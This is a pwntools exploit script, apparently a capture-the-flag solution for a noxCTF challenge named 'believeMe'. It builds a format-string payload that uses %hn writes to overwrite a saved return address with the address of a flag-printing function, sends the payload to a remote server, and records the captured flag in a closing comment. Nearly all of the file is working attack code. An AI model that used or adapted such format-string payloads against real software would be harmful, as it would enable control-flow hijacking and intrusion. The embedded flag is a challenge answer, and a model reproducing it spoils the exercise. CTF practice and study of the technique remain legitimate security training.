#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('believeMe')

host = args.HOST or '18.223.228.52'
port = int(args.PORT or 13337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x080487D3
break *0x0804867B
continue
'''.format(**locals())

# -- Exploit goes here --
# ASLR is off, so we can leak the stack address in a static way

stack_addr = 0xffffddc4 # on the server
#stack_addr = 0xffffc6b4 # my machine

def exploit(ret_offset):
    target = stack_addr + ret_offset
    flag = 0x0804867B

    byte1 = 0x0804
    byte2 = 0x867B

    arg_off = 9

    log.info(hex(target))

    payload = "{}{}%{}x%{}$hn%{}x%{}$hn".format(p32(target + 2), p32(target), byte1 - 8, arg_off, byte2 - byte1, arg_off + 1)
    log.info(payload)
    log.info(len(payload))

    context.terminal = ['gnome-terminal', '-e']
    io = start()

    io.recvline()
    io.recvline()
    io.sendline(payload)
    #io.interactive()

    data = io.recvall()
    print (data)
    io.close()

exploit(-152)
# noxCTF{%N3ver_%7rust_%4h3_%F0rmat}
